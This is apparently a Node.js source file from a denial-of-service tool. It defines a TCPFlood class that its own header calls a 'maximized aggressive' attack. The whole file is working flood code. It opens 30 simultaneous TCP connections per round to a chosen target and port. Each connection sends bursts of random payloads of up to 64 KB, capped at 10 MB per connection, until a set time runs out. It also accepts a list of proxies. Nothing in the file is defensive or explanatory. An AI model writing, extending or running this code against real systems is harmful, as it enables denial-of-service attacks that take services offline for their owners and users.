import net from 'net';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';

/**
 * TCP Flood Attack - MAXIMIZED AGGRESSIVE VERSION
 */
export class TCPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
    }

    async start() {
        const endTime = Date.now() + (this.duration * 1000);

        while (Date.now() < endTime && this.active) {
            // 30 simultaneous TCP floods
            const floods = [];
            for (let i = 0; i < 30; i++) {
                floods.push(this.attack());
            }
            await Promise.allSettled(floods);
        }
    }

    async attack() {
        return new Promise((resolve) => {
            const socket = new net.Socket();
            
            socket.setTimeout(300);
            socket.setNoDelay(true); // Disable Nagle's algorithm
            socket.setKeepAlive(false);
            
            let bytesSent = 0;
            const maxBytes = 10485760; // 10MB per connection

            socket.connect(this.port, this.target, () => {
                const sendBurst = () => {
                    if (!this.active || bytesSent >= maxBytes) {
                        Tools.safeClose(socket);
                        resolve();
                        return;
                    }

                    // Send 100 packets per burst
                    for (let i = 0; i < 100; i++) {
                        if (!this.active) break;
                        
                        // Random payload sizes for unpredictability
                        const payloadSize = Tools.randomInt(1024, 65536);
                        const payload = Tools.randomBytesBuffer(payloadSize);
                        const sent = Tools.send(socket, payload);
                        
                        if (sent) {
                            REQUESTS_SENT.add(1);
                            BYTES_SENT.add(payloadSize);
                            bytesSent += payloadSize;
                        } else {
                            Tools.safeClose(socket);
                            resolve();
                            return;
                        }
                    }
                    
                    setImmediate(sendBurst);
                };

                sendBurst();
            });

            socket.on('error', () => {
                Tools.safeClose(socket);
                resolve();
            });

            socket.on('timeout', () => {
                Tools.safeClose(socket);
                resolve();
            });
        });
    }

    stop() {
        this.active = false;
    }
}
